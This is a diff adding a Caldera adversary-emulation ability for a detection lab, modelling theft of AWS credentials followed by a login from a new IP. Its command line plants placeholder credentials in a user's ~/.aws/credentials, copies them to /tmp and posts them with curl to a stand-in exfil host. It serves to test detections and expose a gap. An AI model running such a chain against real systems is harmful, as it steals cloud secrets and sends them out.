@@ -1,0 +1,28 @@
+- id: linux_creds_aws_read
+  name: Clean cred-theft + AWS creds read + login from new IP
+  description: |
+    Models the canonical cloud cred-theft chain: read realuser's
+    ~/.aws/credentials, exfil via curl, then perform a clean SSH login
+    from a brand-new source IP — no preceding brute-force failures.
+    Phase 21 expects no detection (Gap 3, A5 evidence): the existing
+    auth_anomalous_source_success.py gates on failure_count >= 1, so a
+    clean stolen-creds login never trips it. Phase 22 candidate:
+    auth_baseline_unknown_source_success keyed on a per-user 90-day
+    source-IP baseline.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: Credentials In Files
+  platforms:
+    linux:
+      sh:
+        # Caldera 4.2.0 strips literal newlines (see linux_file_burst_encrypt
+        # for the full explanation). The original multi-line form with a
+        # heredoc collapsed into broken bash. Rewritten as a single line
+        # using `printf` instead of a heredoc and `;` between stages.
+        # Stage 1: stage fake AWS creds. Stage 2: read them (file event).
+        # Stage 3: exfil via curl (fails fast — that's fine).
+        command: |
+          mkdir -p /home/realuser/.aws ; printf '[default]\naws_access_key_id = AKIAEXAMPLEPHASE21\naws_secret_access_key = phase21SecretAccessKeyPlaceholderXXXXXXX\n' > /home/realuser/.aws/credentials ; chown -R realuser:realuser /home/realuser/.aws ; cat /home/realuser/.aws/credentials > /tmp/.aws-stolen ; curl -s --max-time 3 -X POST -d @/tmp/.aws-stolen http://198.51.100.77/exfil || true
+        cleanup: |
+          rm -f /tmp/.aws-stolen ; rm -rf /home/realuser/.aws
